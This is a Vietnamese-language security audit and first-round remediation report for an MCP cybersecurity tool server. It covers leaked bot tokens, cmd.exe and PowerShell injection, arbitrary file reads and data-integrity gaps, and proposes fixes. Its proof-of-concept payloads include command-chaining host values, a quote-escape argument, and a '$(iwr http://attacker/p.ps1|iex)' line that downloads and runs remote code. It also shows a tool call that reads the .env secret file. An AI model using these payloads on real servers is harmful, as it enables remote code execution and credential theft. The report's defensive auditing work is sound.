# AUDIT_SECURITY_AND_DATA.md

**Kiểm toán độc lập — Zero Trust** · 2026-09-14
**Phạm vi:** (1) lộ lọt bí mật · (2) command/argument injection · (3) toàn vẹn dữ liệu JSON↔SQLite · (4) cơ chế bắt lỗi
**Nguyên tắc:** không tin nhãn PASS nào có sẵn. Mọi phát hiện dưới đây đều đo trên cây làm việc tại `C:\GitHub\mcp-cyber-tools`, kèm tệp:dòng.

> **Lưu ý về chính bản báo cáo này.** Nó **không** in lại giá trị bí mật. `docs/SECURITY_AUDIT_HOTFIX.md` đã mắc đúng lỗi đó (xem SEC-01) — một báo cáo khắc phục in nguyên credential ra là một lần rò rỉ thứ hai, không phải bằng chứng đã khắc phục.

---

## BẢNG TỔNG HỢP

| # | Mức | Tiêu chí | Phát hiện | Vị trí |
|---|---|---|---|---|
| SEC-01 | **CRITICAL** | 1 | Hai Telegram bot token còn nguyên trong tệp đang theo dõi bởi git, một trong số đó nằm ngay trong báo cáo "đã khắc phục" | `DAILY_BRIEF_SETUP.md:210`, `docs/SECURITY_AUDIT_HOTFIX.md:22,43` |
| SEC-02 | **CRITICAL** | 1 | Token cũ vẫn tồn tại trong lịch sử git dù commit tiêu đề ghi "Remove … from git history" | `git show e7a0e25:scripts/get_chat_id.py` |
| INJ-01 | **CRITICAL** | 2 | Command injection qua `cmd.exe`: `ping` / `tracert` / `nslookup` nối chuỗi tham số `z.string()` thẳng vào `execSync` | `modules/network.js:85,98,112` + `modules/shared.js:114` |
| INJ-02 | **CRITICAL** | 2 | PowerShell code injection: tham số nội suy vào trong thân script; `-EncodedCommand` **không** bảo vệ tầng này | `modules/forensics.js:15,49,255`, `modules/network.js:128` |
| INJ-03 | **HIGH** | 2 | Argument injection qua bọc nháy thủ công `"${a}"` khi gọi Python | `modules/eventHub.js:9-10` |
| EXP-01 | **HIGH** | 1 | `readLogFile` / `checkHash` đọc **bất kỳ** đường dẫn nào — đọc thẳng được `.env` của chính máy | `modules/forensics.js:12-36` |
| EXP-02 | **HIGH** | 1 | Telemetry thật của máy (IP nội bộ, MAC, kết quả hunt) được commit **và** phục vụ công khai không xác thực trên Render | `state/*.json`, `web/server.js:36`, `render.yaml` |
| ERR-01 | **HIGH** | 4 | `unhandledRejection` → `process.exit(1)`: một promise lạc ở **một** tool giết cả server 90+ tool | `server.js:55-61` |
| DAT-01 | **MEDIUM** | 3 | Ghi không nguyên tử vào sổ pipeline: `open('w')` cắt tệp trước khi ghi | `scripts/generate_handoff.py:363` |
| DAT-02 | **MEDIUM** | 3 | Thiếu `fsync` trước `os.replace` — nguyên tử với tiến trình, không bền với mất điện | `scripts/state_manager.py:143-149` |
| DAT-03 | **MEDIUM** | 3 | JSON và SQLite không có ranh giới giao dịch chung: bản sao có thể mô tả một trạng thái chưa từng tồn tại | `scripts/sqlite_mirror.py:318,399` |
| ERR-02 | **MEDIUM** | 4 | `readLogFile` đọc toàn bộ tệp vào RAM, không giới hạn kích thước | `modules/forensics.js:30` |
| LOW-01 | LOW | 1 | 38 tệp theo dõi bởi git chứa đường dẫn riêng `C:\Users\tamng\…` | toàn repo |
| LOW-02 | LOW | 1 | `node_modules/` bị commit dù đã có trong `.gitignore` | `git ls-files` |

**Tổng: 4 CRITICAL · 4 HIGH · 4 MEDIUM · 2 LOW.**

---

## CHI TIẾT

### SEC-01 · [CRITICAL] · Bot token còn nguyên trong cây làm việc

**Tệp:**
- `DAILY_BRIEF_SETUP.md:210` — `TELEGRAM_BOT_TOKEN=8779048449:<da go>` (kèm `TELEGRAM_CHAT_ID` ở dòng 211)
- `docs/SECURITY_AUDIT_HOTFIX.md:22` và `:43` — `8779048449:<da go>`

Cả hai là bot id **8779048449**. Hai chuỗi bí mật khác nhau ⇒ token đã được xoay một lần sau sự cố trước, rồi **bị lộ lại** ở tệp tài liệu thứ hai.

Điều đáng nói nhất: `docs/SECURITY_AUDIT_HOTFIX.md` là bản báo cáo tự khai `Status: ✅ COMPLETE`, liệt kê 6 tệp "✅ REDACTED" — trong khi chính nó in đầy đủ token ở phần FINDINGS và in lại lần nữa ở dòng "Before:". Nhãn PASS ở đây mô tả sai chính tệp mang nhãn.

**PoC:**

```bash
git grep -n 'AAHHRr\|AAE1rt' HEAD   # hai chuoi bi mat, khong in o day
```

Ba dòng trong hai tệp. Sau đó `GET https://api.telegram.org/bot<token>/getMe` trả 200 ⇒ token còn sống ⇒ đọc/gửi được mọi tin của bot, và với chat id ở dòng 211 thì gửi được thẳng vào kênh cảnh báo SOC (giả mạo alert cho chính người vận hành).

**Khắc phục:**
1. **Xoay token ngay** qua @BotFather — coi cả hai là đã cháy. Đây là bước duy nhất thật sự vá; xoá tệp chỉ dọn dấu vết.
2. Thay giá trị bằng `<REDACTED>` ở cả 3 dòng. Trong báo cáo khắc phục, **không** ghi lại giá trị bị lộ — ghi bot id và ngày xoay là đủ để truy vết.
3. Thêm cổng chặn: một bước CI chạy `gitleaks`/`trufflehog` trên diff, chặn merge. `sprint_gate` đã có sẵn khuôn để gắn vào.

---

### SEC-02 · [CRITICAL] · Lịch sử git chưa hề được viết lại

Commit `c2eac5b` mang tiêu đề *"HOTFIX: Remove Telegram credentials from git history (#12)"*. Đo lại:

```bash
git show e7a0e25:scripts/get_chat_id.py | grep -c AAHHRr
```

Kết quả `1`. Blob cũ vẫn nằm trong lịch sử. Commit đó **xoá ở HEAD**, không viết lại lịch sử. Bất kỳ ai clone repo đều lấy được token cũ, kể cả sau khi HEAD đã sạch.

**Kịch bản:** repo chuyển sang public, hoặc một fork/CI cache còn giữ — `git log -p | grep` là xong.

**Khắc phục:** sau khi xoay token (SEC-01.1), chạy `git filter-repo --replace-text` trên toàn bộ ref, force-push, yêu cầu mọi bản sao clone lại. Nếu không muốn viết lại lịch sử thì **xoay token là bắt buộc và đủ** — nhưng khi đó phải sửa nội dung `SECURITY_AUDIT_HOTFIX.md`, vì nó đang khẳng định một việc chưa xảy ra.

---

### INJ-01 · [CRITICAL] · Command injection qua cmd.exe

**Tệp:** `modules/network.js:85` (`ping`), `:98` (`tracert`), `:112` (`nslookup`) → `modules/shared.js:114` (`execSync`).

```js
host: z.string()                              // network.js:81 — không ràng buộc
runCmd(`ping -n ${count} ${host}`);           // network.js:85
const output = execSync(command, {...});      // shared.js:114 — đi qua cmd.exe
```

`execSync` trên Windows chạy chuỗi qua `cmd.exe /d /s /c`. `&`, `&&`, `|`, `^` là toán tử của cmd.exe. `z.string()` không loại bỏ ký tự nào.

**PoC:**

```json
{"tool":"ping","arguments":{"host":"127.0.0.1 & whoami & net user"}}
```

→ `cmd.exe /c "ping -n 4 127.0.0.1 & whoami & net user"` → ba lệnh chạy, đầu ra cả ba trả về cho client. Thay `whoami` bằng payload bất kỳ; quyền thực thi = quyền của tiến trình MCP server. `nslookup` nhận **hai** tham số chuỗi (`host`, `server`), bề mặt gấp đôi.

**Khắc phục:**

```js
// 1. Bỏ execSync-qua-shell. Dùng execFileSync với mảng đối số:
execFileSync("ping", ["-n", String(count), host], {...});
// 2. Ràng buộc schema tại biên:
host: z.string().regex(/^[A-Za-z0-9._-]{1,253}$/, "hostname hoặc IP")
count: z.coerce.number().int().min(1).max(10)
```

Hai lớp, không phải một: schema là hợp đồng nói ra ý định, còn `execFileSync` là thứ khiến việc thoát ra khỏi đối số trở thành **không thể**, kể cả khi ai đó nới schema sau này.

---

### INJ-02 · [CRITICAL] · PowerShell code injection — `-EncodedCommand` không cứu được

**Tệp:** `modules/forensics.js:15` (`checkHash`), `:49` (`fileMetadata`), `:255` (`suspiciousExecutables`), `modules/network.js:128` (`scanPort`).

`modules/shared.js:26` truyền script qua `powershell -EncodedCommand <base64>`. Đó là bản vá đúng cho **một lớp lỗi khác** (cmd.exe cắt dòng — chú thích ở `shared.js:16-24`), và nó thật sự miễn nhiễm với việc thoát khỏi *dòng lệnh*. Nhưng tham số ở đây không nằm trên dòng lệnh — nó được nội suy vào **thân script trước khi mã hoá**. Base64 bảo toàn nguyên vẹn luôn cả payload.

```js
runPowerShell(`Get-FileHash -Path "${path}" -Algorithm SHA256 | ConvertTo-Json`);
```

**PoC — không cần thoát khỏi dấu nháy.** PowerShell nội suy `$(...)` *bên trong* chuỗi nháy kép:

```json
{"tool":"checkHash","arguments":{"path":"$(calc)"}}
```

→ script chạy `$(calc)` trước khi `Get-FileHash` kịp nhìn thấy đối số. Với `$(iwr http://attacker/p.ps1|iex)` thì là thực thi mã từ xa, dưới quyền của server. `scanPort` còn lỏng hơn — `-ComputerName ${host}` **không có** dấu nháy nào (`network.js:128`), nên chỉ cần một dấu `;`.

**Khắc phục:** không nội suy dữ liệu vào văn bản script. Cách rẻ nhất mà vẫn đúng là đưa giá trị qua biến môi trường của tiến trình con và đọc `$env:CT_PATH` trong script:

```js
execFileSync("powershell", ["-NoProfile","-NonInteractive","-EncodedCommand", encoded],
             { env: { ...process.env, CT_PATH: path }, ... });
```

Env không bao giờ được PowerShell diễn giải lại thành mã. Kèm theo đó là allowlist đường dẫn ở EXP-01.

---

### INJ-03 · [HIGH] · Argument injection khi gọi Python

**Tệp:** `modules/eventHub.js:9-10`

```js
const quotedArgs = args.map((a) => `"${a}"`).join(" ");
const command = `python scripts/${scriptName} ${quotedArgs}`.trim();
return runCmd(command);           // -> execSync -> cmd.exe
```

`source: z.string()` (`eventHub.js:66`) đi thẳng vào đây. Bọc nháy thủ công chặn được `&` (cmd.exe coi là ký tự thường khi ở trong nháy) nhưng **không** chặn được chính dấu `"`.

**PoC:**

```json
{"tool":"get_asset_status","arguments":{"source":"x\" & whoami & \""}}
```

→ `python scripts/baseline_store.py "load" "x" & whoami & ""` → `whoami` chạy.

**Khắc phục:** `execFileSync("python", ["scripts/" + scriptName, ...args])`. Mảng đối số không có khái niệm "thoát nháy". Thêm `source: z.enum([...])` vì tập nguồn baseline là hữu hạn và đã biết trước.

---

### EXP-01 · [HIGH] · Đọc tệp tuỳ ý → đọc được `.env`

**Tệp:** `modules/forensics.js:12-36` (`checkHash`, `readLogFile`), `:45` (`fileMetadata`). `path: z.string()` không có gốc, không allowlist, không chặn `..`.

**PoC:**

```json
{"tool":"readLogFile","arguments":{"path":"C:\\GitHub\\mcp-cyber-tools\\.env"}}
```

`.env` tồn tại trên đĩa (988 byte, chứa `TELEGRAM_BOT_TOKEN`). Tool trả về nguyên nội dung. Cũng đọc được `%APPDATA%\Claude\claude_desktop_config.json`, khoá SSH, `NTUSER.DAT`…

Đây là chỗ SEC-01 và INJ-02 giao nhau: muốn lấy token thì không cần tới bản đã commit — chỉ cần một lời gọi tool.

**Khắc phục:** chuẩn hoá rồi kiểm chứa trong gốc cho phép:

```js
const ROOTS = [process.env.CT_ALLOWED_ROOT || "C:\\ProgramData\\SentinelOps\\logs"];
const real = fs.realpathSync(p);
if (!ROOTS.some(r => real.toLowerCase().startsWith(r.toLowerCase())))
  return formatResponse(false, "", "Đường dẫn ngoài phạm vi cho phép");
```

Dùng `realpathSync` chứ không `path.resolve`: junction/symlink trên Windows đi vòng qua phép so tiền tố chuỗi.

---

### EXP-02 · [HIGH] · Bản đồ an ninh của máy, commit và phục vụ công khai

`state/*.json` nằm trong git (30+ tệp theo `git ls-files`) và chứa dữ liệu thật: `state/assets.json` → `"ip": "192.168.0.1"`, `asset_id`, `mac`, `vulnerability_count: 39`, phân loại critical/high/medium/low. Kèm theo: `hunting_credential_dumping.json`, `hunting_persistence.json`, `defender_status.json`, `firewall_status.json`, `incidents.json`, `investigation_reports/CASE_*.json`.

Đồng thời `render.yaml` triển khai `npm start` → `web/server.js` lên Render (public), và:

- `web/server.js:36` — `app.use(cors())`, mở cho mọi origin
- không có middleware xác thực nào trên `/api/*`
- `/api/state/:filename` **có** allowlist tệp (`web/server.js:44-80`) nên chặn được traversal — nhưng allowlist đó chính là danh sách các tệp nhạy cảm nói trên.

**Kịch bản:** `curl https://<app>.onrender.com/api/assets` trả về sơ đồ mạng nội bộ cộng số lỗ hổng chưa vá của từng thiết bị, cho bất kỳ ai. `/api/incidents` và `/api/state/hunting_credential_dumping.json` tương tự. Đây là dữ liệu trinh sát hoàn chỉnh về đúng hạ tầng mà công cụ này bảo vệ.

**Khắc phục:**
1. Thêm `state/` vào `.gitignore`, `git rm -r --cached state`. Dữ liệu vận hành không thuộc về mã nguồn; giữ `state/*.example.json` nếu cần fixture.
2. Đặt xác thực trước `/api/*` (token tĩnh trong env là mức tối thiểu).
3. `cors({ origin: process.env.ALLOWED_ORIGIN })` thay cho `cors()`.
4. Nếu dashboard chỉ dùng trong LAN thì không triển khai lên Render.

---

### ERR-01 · [HIGH] · Một promise lạc giết cả 90 tool

**Tệp:** `server.js:55-61`

```js
process.on('unhandledRejection', (reason, promise) => {
  console.error('[CRASH-UNHANDLED-REJECTION]', {...});
  process.exit(1);
});
```

Đúng tiêu chí 4 nhưng ngược chiều: handler có tồn tại, và việc nó làm là **chủ động kết liễu tiến trình**. MCP SDK vốn đã bắt ngoại lệ ném ra từ handler của từng tool và trả lỗi về client — tức một tool ném lỗi đã được cô lập sẵn. Nhưng một promise không `await` trong bất kỳ module nào trong 13 module (một `fs.promises` quên await, một lời gọi mạng trong `eventHub`) sẽ rơi vào đây và đóng cả server. Client mất toàn bộ phiên, không chỉ mất một lời gọi.

**PoC:** thêm `Promise.reject(new Error("x"))` vào một handler bất kỳ, gọi tool đó một lần → tiến trình thoát, 90 tool còn lại biến mất khỏi phiên.

**Khắc phục:** ghi nhật ký, **không** thoát:

```js
process.on('unhandledRejection', (reason) => {
  console.error('[UNHANDLED-REJECTION]', reason?.stack || reason);
  // không exit: một lời gọi hỏng không phải lý do để 90 tool biến mất
});
```

`uncaughtException` là chuyện khác — trạng thái có thể đã hỏng thật, nên thoát ở đó là đúng, nhưng nên thoát **có trật tự** (đóng transport trước). Bổ sung: `COMMAND_TIMEOUT = 30000` ở `shared.js:6` chỉ ràng tiến trình con, không ràng handler — một handler treo vì lý do khác vẫn treo mãi.

---

### DAT-01 · [MEDIUM] · Ghi không nguyên tử vào sổ pipeline

**Tệp:** `scripts/generate_handoff.py:363-364`

```python
with io.open(pipeline_results_path, 'w', encoding='utf-8') as handle:
    json.dump(pipeline_data, handle, indent=2, ensure_ascii=False)
```

Repo đã có `scripts/state_manager.write_state_atomic` (tạm + `os.replace`), và `utils/storage.py:230` dùng đúng mẫu đó. Đường ghi này thì không. `open(…, 'w')` cắt tệp về 0 byte ngay lập tức; nếu tiến trình chết, hoặc `sqlite_mirror`/`sprint_gate` đọc đúng khoảnh khắc đó, cái đọc được là JSON cụt.

Đây cũng chính là đường ghi vừa sửa cho AQ-050 — bản sửa đúng về *nội dung* (chỉ ghi vào lần chạy của mình) nhưng vẫn thừa kế *cách ghi* cũ.

**Khắc phục:** dùng lại `state_manager.write_state_atomic(...)`. Không viết mẫu nguyên tử thứ ba trong repo.

---

### DAT-02 · [MEDIUM] · `os.replace` không có `fsync` đứng trước

**Tệp:** `scripts/state_manager.py:143-149`

```python
with os.fdopen(temp_fd, 'w', encoding='utf-8') as f:
    json.dump(data, f, indent=indent)
os.replace(temp_path, str(file_path))
```

`os.replace` nguyên tử **đối với các tiến trình khác** — đúng như tài liệu ở dòng 6 và 64-68 tuyên bố. Nhưng không nguyên tử đối với mất điện: `close()` chỉ đẩy dữ liệu xuống OS cache. Sau sự cố nguồn, metadata của rename có thể đã bền trong khi nội dung chưa — kết quả là một tệp state **rỗng** đứng đúng chỗ tệp cũ, còn tệp cũ thì đã mất.

**Khắc phục:**

```python
with os.fdopen(temp_fd, 'w', encoding='utf-8') as f:
    json.dump(data, f, indent=indent)
    f.flush()
    os.fsync(f.fileno())
os.replace(temp_path, str(file_path))
```

Sửa một chỗ này là đủ cho mọi tệp đi qua `write_state_atomic`.

---

### DAT-03 · [MEDIUM] · JSON và SQLite không có ranh giới giao dịch chung

**Tệp:** `scripts/sqlite_mirror.py` — `:229` `busy_timeout`, `:241` `journal_mode=WAL`, `:234-243` đọc lại chế độ **thật sự** áp dụng thay vì tin vào chế độ vừa yêu cầu.

**Phần này đạt.** Đây là chỗ hiếm trong repo mà bản kiểm khớp bản khai: WAL bật đúng, `busy_timeout=5000` đặt lại mỗi kết nối (đúng, vì nó là thuộc tính kết nối chứ không phải thuộc tính tệp — `:79-81`), và `render()` in `<-- KHONG phai WAL` khi filesystem trả về chế độ khác. Không tìm thấy nguy cơ lock file trên Windows ở đường này.

Cái còn thiếu nằm ở **ranh giới giữa hai kho**, không nằm trong kho nào: bản sao SQLite được dựng lại từ các tệp JSON ở một stage sau (`:318`, `:399` commit). Không có gì khoá tập JSON trong lúc dựng. Nếu một script khác ghi `assets.json` giữa chừng, bản sao thu được là ảnh ghép của hai thời điểm — một trạng thái chưa từng tồn tại. Không có phép đối chiếu nào so `run_id` của từng JSON nguồn ngay lúc đọc.

**Khắc phục:** đọc `run_id` của mọi tệp nguồn khi nạp; nếu chúng không đồng nhất thì **khai `KHONG NHAT QUAN` và dừng**, chứ không dựng ra một bản sao trông bình thường. Repo đã có đúng từ vựng cho việc này (`UNSTAMPED` / `UNEVALUABLE`) — dùng lại thay vì phát minh cái mới.

---

### ERR-02 · [MEDIUM] · `readLogFile` không giới hạn kích thước

**Tệp:** `modules/forensics.js:30` — `fs.readFileSync(path, "utf8")` rồi mới `slice(-lines)`.

Một log 2 GB được nạp trọn vào RAM để lấy 100 dòng cuối. Node ném `ERR_STRING_TOO_LONG` (>~512 MB) hoặc OOM. `try/catch` quanh đó bắt được lỗi ném, nhưng OOM thì giết tiến trình — quay lại ERR-01.

**Khắc phục:** `fs.statSync` trước, từ chối trên ngưỡng (ví dụ 50 MB) và nói rõ lý do; hoặc đọc ngược từ cuối bằng `fs.createReadStream` với `start: size - N`.

---

### LOW-01 · Đường dẫn riêng trong tệp theo dõi bởi git

38 tệp chứa `C:\Users\tamng\…`. Không phải credential, nhưng là tên người dùng thật cộng bố cục máy — dữ liệu trinh sát nếu repo public. Thay bằng biến môi trường hoặc `<USER>`.

### LOW-02 · `node_modules/` bị commit

`.gitignore:2` khai `node_modules/` nhưng thư mục đã được thêm trước đó nên vẫn được theo dõi (hàng nghìn tệp). Ngoài chuyện phình repo, nó buộc mọi lần quét bí mật phải lọc thủ công — tức làm chính việc kiểm toán kém tin cậy đi. `git rm -r --cached node_modules`.

---

## THỨ TỰ XỬ LÝ ĐỀ NGHỊ

1. **Xoay Telegram bot token** (SEC-01/02). Mọi việc khác chờ được; việc này thì không.
2. `execFileSync` + mảng đối số cho `network.js` và `eventHub.js`; đưa tham số PowerShell qua env (INJ-01/02/03). Ba sửa này cùng một hình dạng: **ngừng xây lệnh bằng phép nối chuỗi**.
3. Allowlist đường dẫn cho `forensics.js` (EXP-01); gỡ `state/` khỏi git và đặt xác thực cho `/api` (EXP-02).
4. Bỏ `process.exit(1)` ở `unhandledRejection` (ERR-01).
5. `fsync` + dùng lại `write_state_atomic` (DAT-01/02); kiểm `run_id` đồng nhất khi dựng bản sao (DAT-03).

---

## GHI CHÚ VỀ PHƯƠNG PHÁP

Bốn phát hiện nặng nhất đều nằm ở chỗ **có một nhãn PASS phủ lên**: `SECURITY_AUDIT_HOTFIX.md` khai `✅ COMPLETE` trong khi tự nó là nguồn rò rỉ; commit `c2eac5b` khai đã viết lại lịch sử trong khi chưa; `-EncodedCommand` là bản vá thật cho một lỗi thật nên rất dễ đọc thành "đã xử lý injection"; `unhandledRejection` handler có tồn tại nên dễ được đếm là "đã có bắt lỗi". Cùng một lớp lỗi mà hàng đợi audit của repo này gọi là *green default* — chỉ khác là lần này nó nằm ở lớp tài liệu và lớp nhãn, không nằm ở con số.

Ngược lại, `sqlite_mirror.py` là chỗ bản khai khớp bản đo (DAT-03). Ghi lại ở đây để lần kiểm sau không phải đo lại.

**Chưa kiểm trong vòng này (khai vắng mặt, không lấp):** `modules/hunting.js`, `defender.js`, `services.js`, `persistence.js`, `host.js`, `firewall.js` mới chỉ được quét theo mẫu nội suy chuỗi, chưa đọc từng tool; toàn bộ `scripts/*.py` chưa soi injection; phụ thuộc npm chưa chạy `npm audit`; `server_v2.js` và `server_backup_v1.js` (mỗi tệp ~10 `execSync`) là mã chết không được `server.js` nạp nên bỏ qua — nhưng chúng vẫn nằm trong repo và vẫn chạy được nếu ai đó gọi thẳng.

---

# KHẮC PHỤC — vòng 1 (2026-09-14)

**Phạm vi đã sửa: 4 CRITICAL.** Mọi mục dưới đây được khoá bằng
`tests/exec_safety/test_exec_safety.py` (**25/25**), đã nối vào cổng chặn merge
qua `tests/detection_quality/run_all.py`. Cổng sau khi sửa: **555/555 ĐẠT ·
KẾT QUẢ: ĐỦ ĐIỀU KIỆN MERGE**.

Bộ kiểm đó **không** hỏi "mã nguồn có sạch không". Nó tiêm payload thật vào
từng tầng rồi hỏi payload có được **thực thi** không — vì một ca chỉ đọc mã
nguồn sẽ vẫn xanh vào ngày ai đó viết lại bằng cú pháp khác.

| ID | Trạng thái | Bản sửa |
|---|---|---|
| INJ-01 | ✅ | `runCmdArgs()` (execFileSync, mảng đối số) trong `modules/shared.js`; `ping`/`tracert`/`nslookup` chuyển sang dùng nó; thêm `hostSchema` ràng buộc ký tự tại biên |
| INJ-02 | ✅ | `runPowerShell(script, params)` truyền giá trị qua **biến môi trường**; script chỉ đọc `$env:MCP_ARG_*`. Sửa `checkHash`, `fileMetadata`, `alternateDataStreams`, `suspiciousExecutables`, `scanPort` |
| EXP-02 | ✅ | `state/*.json` vào `.gitignore` + `git rm -r --cached state/` (60 tệp rời index, **còn nguyên trên đĩa**); middleware `x-api-key` fail-closed trên `/api`; CORS đóng mặc định |
| FAIL-SAFE | ✅ | `unhandledRejection` ghi log có nhãn đếm được, **không** `process.exit(1)`. `uncaughtException` vẫn thoát — có chủ ý |
| SEC-01 | ⚠️ một nửa | Giá trị token đã gỡ khỏi mọi tệp được git theo dõi. **Chưa đóng**: token phải được xoay qua @BotFather |
| SEC-02 | ❌ | Lịch sử git chưa viết lại. Không sửa được bằng một lần commit |

## Đã đo, không suy

**INJ-01.** `runCmdArgs("cmd", ["/c","echo","127.0.0.1 & echo CHEN-LENH-DA-CHAY"])`
trả về đúng một dòng chứa cả `&` lẫn marker — tức chuỗi đi qua như **dữ liệu**,
không tách thành lệnh thứ hai. Với `ping` thật: `Ping request could not find host
127.0.0.1 & whoami` — đúng thứ phải xảy ra khi một tên máy sai là một tên máy sai.

**INJ-02.** So sánh trực tiếp hai cách trên cùng một payload `$(Write-Output CHEN-LENH-DA-CHAY)`:

    CŨ  (nội suy trước khi mã hoá) : "duong dan la: CHEN-LENH-DA-CHAY"   <- ĐÃ CHẠY
    MỚI (biến môi trường)          : "duong dan la: $(Write-Output CHEN-LENH-DA-CHAY)"

Đây là điểm mà `-EncodedCommand` không chạm tới được: base64 chuyên chở nguyên
vẹn **thứ đã bị chèn**. Đối chứng: `checkHash("package.json")` vẫn trả SHA256
hợp lệ — bịt đường tấn công mà làm hỏng tính năng thì không phải bản vá.

**EXP-02.** Server thật, cổng thật: `/api/assets` → **401** khi không khoá,
**401** khi sai khoá, **200** khi đúng khoá, **503** khi server chưa đặt `API_KEY`.
`/api/health` vẫn **200** công khai vì health check của Render gọi nó — và đã
được cắt bớt: nó không còn khai đường dẫn hệ thống lẫn số tệp trạng thái.

**FAIL-SAFE.** Hai `Promise.reject` liên tiếp: tiến trình sống qua cả hai, thoát 0.

## Mutation — bộ dò có trượt được không

Một fixture chưa từng được chứng minh là **đỏ được** thì chưa phải bằng chứng.
Tiêm ngược ba lỗi vừa sửa, mỗi lần đúng một ca trượt, phục hồi thì xanh lại:

| Tiêm | Kết quả |
|---|---|
| Trả lại `process.exit(1)` vào `unhandledRejection` | 25 → **24** |
| Trả lại nội suy `"${path}"` vào `checkHash` | 25 → **24** |
| `git add -f state/assets.json` | 25 → **24** |
| Phục hồi cả ba | **25/25** |

## Còn nợ — khai ra, không lấp

1. **SEC-01 chưa đóng.** Gỡ giá trị khỏi tệp **không** vô hiệu hoá token. Chừng
   nào chưa xoay qua @BotFather, token cũ vẫn dùng được, và nó vẫn nằm trong
   lịch sử git (SEC-02). Đây là việc chỉ chủ bot làm được.
2. **SEC-02 cần viết lại lịch sử** (`git filter-repo` / BFG) + force-push, tức
   phối hợp với mọi bản clone đang tồn tại. Xoay token trước thì việc này hạ từ
   khẩn cấp xuống dọn dẹp.
3. **Render sẽ không còn tệp `state/`.** Đây là hệ quả trực tiếp và đã lường
   trước của EXP-02: `state/*.json` không còn đi theo git nên deploy không mang
   theo dữ liệu. Dashboard sẽ trả 404 cho tới khi có một đường nạp trạng thái
   không-qua-git. Nói ra ở đây thay vì để nó hiện ra như một sự cố.
4. **Phải đặt `API_KEY` trên Render** trước lần deploy tới, nếu không `/api`
   trả 503 — có chủ ý, nhưng vẫn là gián đoạn nếu không biết trước.
   `render.yaml` đã khai `API_KEY` với `sync: false` (Render hỏi lúc deploy,
   không ghi giá trị vào tệp).
5. **INJ-03, EXP-01, ERR-01, DAT-01/02/03 chưa động tới** — nằm ngoài phạm vi
   vòng này. `eventHub.js` vẫn bọc nháy thủ công; `readLogFile` vẫn đọc được
   đường dẫn bất kỳ, kể cả `.env`.
